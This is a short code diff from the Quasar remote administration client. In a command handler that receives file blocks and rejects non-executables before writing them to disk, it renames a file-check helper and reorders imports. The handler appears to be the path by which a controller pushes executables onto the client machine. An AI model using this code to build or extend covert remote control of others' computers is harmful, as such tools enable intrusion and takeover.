@@ -1,11 +1,11 @@
-﻿using System;
-using System.Net;
-using System.Threading;
-using Quasar.Client.Helper;
-using Quasar.Client.Installation;
+﻿using Quasar.Client.Installation;
 using Quasar.Client.Utilities;
+using Quasar.Common.Helpers;
 using Quasar.Common.IO;
 using Quasar.Common.Messages;
+using System;
+using System.Net;
+using System.Threading;
 
 namespace Quasar.Client.Commands
 {
@@ -24,7 +24,7 @@ namespace Quasar.Client.Commands
 
                 try
                 {
-                    if (command.CurrentBlock == 0 && !FileHelper.IsValidExecuteableFile(command.Block))
+                    if (command.CurrentBlock == 0 && !FileHelper.HasExecutableIdentifier(command.Block))
                         throw new Exception("No executable file");
 
                     FileSplit destFile = new FileSplit(filePath);
